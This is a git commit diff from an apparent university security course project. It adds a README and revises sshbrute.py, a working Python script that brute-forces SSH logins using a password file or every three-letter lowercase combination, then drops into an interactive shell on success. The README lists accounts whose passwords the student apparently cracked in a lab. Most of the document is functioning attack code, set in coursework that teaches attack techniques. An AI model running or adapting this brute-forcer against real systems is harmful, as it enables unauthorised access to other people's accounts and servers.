78716cbb6099b63abe100a9d876aa8b9f6e586df
Kyle <healykys@gmail.com>
2019-02-04 15:20:26 -0600

    Added .gitignore and README

---
+++ week03/README.txt
@@ -0,0 +1,29 @@
+CS 62700 Project 2: Python SSH Brute Force
+Kyle Healy
+2/6/2019
+
+NAME
+	sshbrute.py - 
+
+USAGE
+	./sshbrute.py <-f filename | -g> <host> <username>
+
+DESCRIPTION
+
+OPTIONS
+	-f
+	-g
+
+INPUT FILE FORMAT
+	
+
+KNOWN BUGS AND LIMITATIONS
+
+ADDITIONAL NOTES
+
+Account	Password	Method Discovered
+usera	abc123		File
+userb	baseball	File
+userc	adf		Generated
+userd	letmein		File
+usere	cxv		Generated
--- week03/sshbrute.py
+++ week03/sshbrute.py
@@ -8,33 +8,37 @@ def usage():
 
 def readCmdLine():
     # Read command line and pull out flags
-   gLen = len(sysgv)
-    ifgLen < 4:
-        sys.exit()
-    elifgLen == 5 and sysgv[1]=="-f":
-        filename = sysgv[2]
-        host = sysgv[3]
-        user = sysgv[4]
-    elifgLen ==4 and sysgv[1]=="-g":
+    gLen = len(sys.argv)
+    if gLen == 5 and sys.argv[1]=="-f":
+        filename = sys.argv[2]
+        host = sys.argv[3]
+        user = sys.argv[4]
+    elif gLen == 4 and sys.argv[1]=="-g":
         filename = None
-        host = sysgv[3]
-        user = sysgv[4]
+        host = sys.argv[2]
+        user = sys.argv[3]
     else:
         usage()
     return (filename, host, user)
 
 
-def gen3cPass(cacters):
-    passwords = [];
-#TODO: Remove duplicate cacters in string before looping all of these
-    for c1 in cacters:
-        for c2 in cacters:
-            for c3 in cacters:
+def gen3cPass(allCharacters):
+    passwords = []
+    characters = "".join(set(allCharacters)) #Remove duplicates
+    for c1 in characters:
+        for c2 in characters:
+            for c3 in characters:
                 passwords.append(c1+c2+c3)
     return passwords
 
-def trylogin(host, user, passwordList):
-    
+def readPassFromFile(fname):
+    passwords=[]
+    with open(fname,'r') as f:
+        for line in f:
+            passwords.append(line.strip())
+    return passwords
+
+def connectToServer(host, user):
     # construct the login string
     connStr = 'ssh ' + user + '@' + host
     
@@ -46,26 +50,50 @@ def trylogin(host, user, passwordList):
     if ret == 1:
         print "Bad hostname"
         sys.exit()
-    print "found password prompt"
-    
-    # send the password
+    if ret == 2:
+        print "Unknown EOF found. Exiting"
+        sys.exit()
+#    print "found password prompt"
+    return child
+
+def attemptPassword(child, password):
+#    print "Sending password {}".format(password)
     child.sendline(password)
+    return child
+
+def trylogin(host, user, passwordList):
+   
+    child = connectToServer(host,user)
     
-    ret = child.expect('$')
-    print "Found command prompt. We're in!"
-    
-    child.sendline()
-    
-    child.interact()
+    for password in passwordList:
+        child = attemptPassword(child,password)
+        ret = child.expect(['\$','try again','publickey','closed','closed.'])
+#        print "Return {}".format(ret)
+        if ret==0:
+            print "Found command prompt. We're in! Password = {}".format(password)
+            child.sendline()
+            child.interact()
+        elif ret ==2: #Broken connection. Reset
+            child = connectToServer(host,user)
+        elif ret==3 or ret==4: 
+            print 'Exit program.'
+            break
+        else:
+#            print "Same connection. Try to continue."
+            continue
+            
+    print "Failed to find password in list. Exiting"
 
 
-(fname, host, user) = readCmdLine()
-if fname == None:
-    passList = gen3cPass("abcdefghijklmnopqrstuvwxyz")
-else:
-    #read file of passwords
-    passList = readPassFromFile(fname)
-trylogin("localhost", "newuser", "qwerty")
-#trylogin(host, user, passList)
+if __name__ == "__main__":
+    print "Starting sshbrute.py"
+    (fname, host, user) = readCmdLine()
+#    print "read command lines f:{} h:{} u:{}".format(fname,host,user)
+    if fname == None:
+        passList = gen3cPass("abcdefghijklmnopqrstuvwxyz")
+    else:
+        #read file of passwords
+        passList = readPassFromFile(fname)
+    trylogin(host, user, passList)
 
 
